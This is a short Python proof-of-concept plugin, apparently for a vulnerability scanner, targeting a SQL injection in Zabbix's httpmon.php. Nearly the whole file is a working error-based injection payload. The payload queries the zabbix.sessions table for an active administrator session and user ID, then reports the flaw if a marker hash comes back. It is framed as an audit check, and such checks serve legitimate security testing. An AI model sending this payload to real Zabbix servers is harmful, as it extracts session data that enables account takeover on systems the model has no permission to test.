#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  Zabbix Httpmon.php SQL Injection
Reference :  http://wooyun.org/bugs/wooyun-2010-084877
Author    :  NoName
"""

import  re

def assign(service, arg):
    if service == "zabbix":
        return True, arg
        
def audit(arg):
    payload = "/httpmon.php?applications=2%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%28select%20concat%28cast%28concat%28md5('123'),0x7e,userid,0x7e,status%29%20as%20char%29,0x7e%29%29%20from%20zabbix.sessions%20where%20status=0%20and%20userid=1%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29"
    code, head, res, errcode, _ = curl.curl(arg + payload)
    if code == 200:
        m = re.search("202cb962ac59075b964b07152d234b70",res)
        if m:
            security_hole('zabbix httpmon.php sql injection exists.')

if __name__ == '__main__':
    from dummy import *
    audit(assign('zabbix', 'http://www.example.com/')[1])